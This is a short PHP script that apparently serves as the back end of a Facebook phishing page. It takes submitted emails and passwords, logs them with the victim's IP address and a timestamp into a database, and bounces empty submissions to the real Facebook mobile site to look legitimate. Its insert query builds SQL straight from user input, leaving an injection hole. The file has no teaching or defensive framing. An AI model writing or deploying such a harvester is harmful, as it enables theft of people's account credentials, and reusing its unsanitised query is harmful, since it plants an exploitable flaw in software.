<?php
error_reporting(0);

$usuario = $_POST['email'];
$clave = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: https://m.facebook.com/');
}else{

  require_once('../conn.php');
  if(isset($_POST['email'])){

      setcookie("user1", $_POST['email'], time() + (3600 * 5), "/");    //for 5 hour
      date_default_timezone_set('Asia/Colombo');
      $date = date("Y/m/d");
      $time = date("H:i:s");

      //echo $mail. '<br>'. $pw;

      $userData = "INSERT INTO user (`User`,`Pass`,`Date`,`Time`,`IP`) VALUES ('$usuario','$clave','$date','$time','$ip')";

      echo $userData;
      if(mysqli_query($con,$userData)){
          session_start();
          $_SESSION['user'] = $usuario;
          header('Location: ../');
      }else{
          header('Location: ./index.php');
      }


      
  }
}
?>
